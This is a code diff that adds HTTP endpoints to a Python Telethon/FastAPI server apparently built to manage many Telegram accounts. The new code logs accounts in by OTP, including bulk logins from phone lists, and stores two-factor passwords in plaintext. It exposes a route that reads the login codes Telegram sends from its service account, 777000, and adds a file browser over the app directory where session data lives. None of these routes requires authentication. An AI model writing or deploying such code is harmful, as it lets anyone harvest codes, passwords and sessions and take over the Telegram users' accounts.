@@ -15,7 +15,7 @@ from telethon.tl.types import User
 from telethon.tl.functions.messages import DeleteHistoryRequest
 from telethon.tl.functions.contacts import GetContactsRequest
 from telethon.errors import *
-from fastapi import FastAPI, HTTPException
+from fastapi import FastAPI, HTTPException, Depends
 from fastapi.responses import HTMLResponse, FileResponse
 from fastapi.staticfiles import StaticFiles
 from pydantic import BaseModel, Field
@@ -3195,6 +3195,343 @@ async def auto_health_recovery_loop() -> None:
             audit_logger.error(f"Recovery loop error: {e}")
 
         await asyncio.sleep(sweep_interval)
+
+
+
+class _AuthBotAdapter:
+    def __init__(self):
+        self._lock = asyncio.Lock()
+        self.sessions: Dict[str, TelegramClient] = {}
+        self.pending_codes: Dict[str, dict] = {}
+
+    def create_user_client(self, phone: str):
+        clean_phone = normalize_phone(phone)
+        existing = db.get_session_by_phone(clean_phone) or {}
+        device = get_device_profile(existing) if existing else (
+            random.choice(DEVICE_PROFILES) if DEVICE_PROFILES else {}
+        )
+        return session_manager.create_client(
+            session_str=StringSession().save(),
+            api_id=CONFIG["API_ID"],
+            api_hash=CONFIG["API_HASH"],
+            device=device,
+            proxy=None,
+        )
+
+    def save_account_metadata(self, phone: str):
+        clean_phone = normalize_phone(phone)
+        client = self.sessions.get(clean_phone)
+        if not client:
+            return
+        existing = db.get_session_by_phone(clean_phone) or {}
+        db.save_authorized_session(
+            clean_phone,
+            client.session.save(),
+            AccountStatus.ACTIVE,
+            get_device_profile(existing),
+            two_fa_password=None,
+        )
+
+    def save_twofa_password(self, phone: str, password: str):
+        clean_phone = normalize_phone(phone)
+        existing = db.get_session_by_phone(clean_phone) or {}
+        db.save_authorized_session(
+            clean_phone,
+            existing.get("session_string") or existing.get("session") or StringSession().save(),
+            AccountStatus.ACTIVE,
+            get_device_profile(existing),
+            two_fa_password=password,
+        )
+
+
+auth_bot = _AuthBotAdapter()
+
+
+class LoginReq(BaseModel):
+    phone: str
+
+class VerifyReq(BaseModel):
+    phone: str
+    code: str
+
+class Verify2FAReq(BaseModel):
+    phone: str
+    password: str
+
+class BulkLoginReq(BaseModel):
+    phones: list[str]
+
+
+@app.post("/login")
+async def api_login(req: LoginReq):
+    phone = req.phone
+    phone_key = normalize_phone(phone)
+    login_owner = f"login:{phone_key}"
+    client = None
+
+    try:
+        login_result = await shared_login_process(phone, login_owner)
+        client = login_result["client"]
+        code_hash = login_result["code_hash"]
+
+        async with auth_bot._lock:
+            auth_bot.pending_codes[phone_key] = {
+                "client": client,
+                "phone_code_hash": code_hash,
+                "timeout": 120,
+            }
+
+        return {
+            "status": "code_sent",
+            "phone": phone,
+            "message": "OTP successfully sent to device. Use /verify to confirm code."
+        }
+
+    except FloodWaitError as e:
+        if client:
+            try:
+                await client.disconnect()
+            except:
+                pass
+        raise HTTPException(429, f"Rate limited. Wait {e.seconds}s")
+    except asyncio.TimeoutError:
+        if client:
+            try:
+                await client.disconnect()
+            except:
+                pass
+        raise HTTPException(408, "Request timeout: Could not connect to Telegram or send code")
+    except HTTPException:
+        if client:
+            try:
+                await client.disconnect()
+            except:
+                pass
+        raise
+    except Exception as e:
+        if client:
+            try:
+                await client.disconnect()
+            except:
+                pass
+        raise HTTPException(400, str(e))
+
+
+@app.post("/verify")
+async def api_verify(req: VerifyReq):
+    phone, code = req.phone, req.code
+    phone_key = normalize_phone(phone)
+
+    async with auth_bot._lock:
+        if phone_key not in auth_bot.pending_codes:
+            raise HTTPException(404, "No pending login for this number. Call /login first.")
+        pending = auth_bot.pending_codes[phone_key]
+        client = pending["client"]
+
+    try:
+        await client.sign_in(phone=phone, code=code, phone_code_hash=pending["phone_code_hash"])
+        async with auth_bot._lock:
+            auth_bot.sessions[phone_key] = client
+            del auth_bot.pending_codes[phone_key]
+        auth_bot.save_account_metadata(phone_key)
+
+        me = await client.get_me()
+        return {"status": "ok", "phone": phone, "name": f"{me.first_name} {me.last_name or ''}".strip(), "username": me.username, "id": me.id}
+
+    except SessionPasswordNeededError:
+        return {"status": "2fa_required", "phone": phone}
+    except Exception as e:
+        raise HTTPException(400, str(e))
+
+
+@app.post("/verify_2fa")
+async def api_verify_2fa(req: Verify2FAReq):
+    phone = req.phone
+    phone_key = normalize_phone(phone)
+
+    async with auth_bot._lock:
+        if phone_key not in auth_bot.pending_codes:
+            raise HTTPException(404, "No pending login for this number. Call /login first.")
+        client = auth_bot.pending_codes[phone_key]["client"]
+    try:
+        await client.sign_in(password=req.password)
+        async with auth_bot._lock:
+            auth_bot.sessions[phone_key] = client
+            del auth_bot.pending_codes[phone_key]
+        auth_bot.save_account_metadata(phone_key)
+        auth_bot.save_twofa_password(phone_key, req.password)
+
+        me = await client.get_me()
+        return {"status": "ok", "phone": phone, "name": f"{me.first_name} {me.last_name or ''}".strip(), "username": me.username, "id": me.id}
+
+    except Exception as e:
+        raise HTTPException(400, str(e))
+
+
+@app.get("/sessions")
+async def api_sessions():
+    async with auth_bot._lock:
+        return {
+            "active": list(auth_bot.sessions.keys()),
+            "pending": list(auth_bot.pending_codes.keys()),
+        }
+
+
+@app.get(
+    "/otp/{phone}",
+    summary="Fetch OTP messages",
+    description=(
+        "Returns recent messages from Telegram's OTP sender (777000) for the given phone number. "
+        "Use `since_seconds` to restrict to messages received in the last N seconds (default 300 = last 5 min). "
+        "Use `limit` to control how many messages to return (default 5)."
+    ),
+)
+async def get_otp(
+    phone: str,
+    limit: int = 5,
+    since_seconds: int = 300,
+):
+    phone_key = normalize_phone(phone)
+    async with auth_bot._lock:
+        if phone_key not in auth_bot.sessions:
+            raise HTTPException(404, "No active session for this number. Login first via /login.")
+        client = auth_bot.sessions[phone_key]
+    try:
+        cutoff = datetime.now(timezone.utc) - timedelta(seconds=since_seconds)
+        messages = await client.get_messages(777000, limit=limit)
+        results = []
+        for msg in messages:
+            if msg.date < cutoff:
+                continue
+            ist = msg.date + timedelta(hours=5, minutes=30)
+            results.append({
+                "id": msg.id,
+                "text": msg.message,
+                "received_at_ist": ist.strftime("%d-%m-%Y %H:%M:%S"),
+                "received_at_utc": msg.date.strftime("%d-%m-%Y %H:%M:%S"),
+            })
+        return {"phone": phone, "count": len(results), "messages": results}
+    except Exception as e:
+        raise HTTPException(500, str(e))
+
+
+@app.get("/session/{phone}")
+async def api_check(phone: str):
+    phone_key = normalize_phone(phone)
+    async with auth_bot._lock:
+        if phone_key in auth_bot.sessions:
+            try:
+                me = await auth_bot.sessions[phone_key].get_me()
+                return {"status": "active", "name": f"{me.first_name} {me.last_name or ''}".strip(), "username": me.username}
+            except Exception:
+                return {"status": "expired"}
+        if phone_key in auth_bot.pending_codes:
+            return {"status": "pending_otp"}
+    raise HTTPException(404, "No session found")
+
+
+@app.delete("/session/{phone}")
+async def api_logout(phone: str):
+    phone_key = normalize_phone(phone)
+    async with auth_bot._lock:
+        if phone_key in auth_bot.sessions:
+            try:
+                await auth_bot.sessions[phone_key].log_out()
+            except Exception:
+                pass
+            try:
+                await auth_bot.sessions[phone_key].disconnect()
+            except Exception:
+                pass
+            del auth_bot.sessions[phone_key]
+            return {"status": "logged_out"}
+        if phone_key in auth_bot.pending_codes:
+            try:
+                await auth_bot.pending_codes[phone_key]["client"].disconnect()
+            except Exception:
+                pass
+            del auth_bot.pending_codes[phone_key]
+            return {"status": "cancelled"}
+    raise HTTPException(404, "No session found")
+
+
+@app.post("/bulk_login")
+async def api_bulk_login(req: BulkLoginReq):
+    results = {"sent": [], "already": [], "failed": {}}
+    for phone in req.phones:
+        try:
+            phone_key = normalize_phone(phone)
+            async with auth_bot._lock:
+                if phone_key in auth_bot.sessions:
+                    results["already"].append(phone)
+                    continue
+
+            client = auth_bot.create_user_client(phone_key)
+            await client.connect()
+            if await client.is_user_authorized():
+                async with auth_bot._lock:
+                    auth_bot.sessions[phone_key] = client
+                results["already"].append(phone)
+                continue
+            sent = await client.send_code_request(phone)
+            async with auth_bot._lock:
+                auth_bot.pending_codes[phone_key] = {"client": client, "phone_code_hash": sent.phone_code_hash, "timeout": sent.timeout}
+            results["sent"].append(phone)
+            await asyncio.sleep(3)
+        except Exception as e:
+            results["failed"][phone] = str(e)
+    return results
+
+
+# === File Browser ===
+BASE_DIR = Path(__file__).resolve().parent
+
+
+def _dir_listing(directory: Path, url_path: str) -> HTMLResponse:
+    entries = sorted(directory.iterdir(), key=lambda p: (p.is_file(), p.name.lower()))
+    rows = ""
+    if url_path.strip("/"):
+        parent = "/" + "/".join(url_path.strip("/").split("/")[:-1])
+        rows += f'<tr><td><a href="/files{parent}">.. (up)</a></td><td></td></tr>'
+    for entry in entries:
+        entry_url = f"/files/{url_path.strip('/')}/{entry.name}".replace("//", "/")
+        size = f"{entry.stat().st_size:,} B" if entry.is_file() else "—"
+        icon = "📄" if entry.is_file() else "📁"
+        rows += f'<tr><td><a href="{entry_url}">{icon} {entry.name}</a></td><td>{size}</td></tr>'
+    html = f"""<!DOCTYPE html>
+<html><head><title>/{url_path}</title>
+<style>body{{font-family:monospace;padding:20px}}table{{border-collapse:collapse;width:100%}}
+td{{padding:6px 12px;border-bottom:1px solid #eee}}a{{text-decoration:none;color:#0066cc}}a:hover{{text-decoration:underline}}</style>
+</head><body>
+<h2>/{url_path}</h2><hr>
+<table><tr><th align=left>Name</th><th align=left>Size</th></tr>{rows}</table>
+</body></html>"""
+    return HTMLResponse(html)
+
+
+@app.get("/files", response_class=HTMLResponse)
+@app.get("/files/{file_path:path}")
+async def browse(file_path: str = ""):
+    target = (BASE_DIR / file_path).resolve()
+    base_resolved = BASE_DIR.resolve()
+
+    # Strict path validation to prevent directory traversal and symlink attacks
+    try:
+        target.relative_to(base_resolved)
+    except ValueError:
+        raise HTTPException(403, "Access denied")
+
+    if not target.exists():
+        raise HTTPException(404, "Not found")
+    if target.is_dir():
+        return _dir_listing(target, file_path)
+    return FileResponse(target, filename=target.name)
+
+
+# === Health check endpoint (replaces separate HTTP health server) ===
+@app.get("/health")
+async def health():
+    return {"status": "ok"}        
 
 # ──────────────────────────────────────────────
 # 29. SERVER LAUNCHER (MUST BE AT THE VERY END)
